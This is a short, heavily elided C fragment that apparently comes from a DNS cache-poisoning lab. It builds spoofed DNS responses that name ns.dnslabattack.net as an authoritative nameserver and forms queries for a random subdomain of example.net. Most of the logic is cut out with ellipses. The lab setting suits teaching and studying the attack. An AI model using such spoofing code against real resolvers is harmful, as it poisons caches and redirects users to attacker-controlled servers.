...
int response(char *request_url, char *src_addr, char *dest_addr)
{
    ...
    strcpy(nsname, "\2ns\14dnslabattack\3net");
    ...
    strcpy(ar, "\2ns\14dnslabattack\3net");
    ...
    ***************************************************************************************/
    ...
    din.sin_addr.s_addr = inet_addr(dest_addr); // this is the first argument we input into the program
...
int main(int argc, char *argv[])
{
    ...
    strcpy(data, "\5abcde\7example\3net");
    int length = strlen(data) + 1;
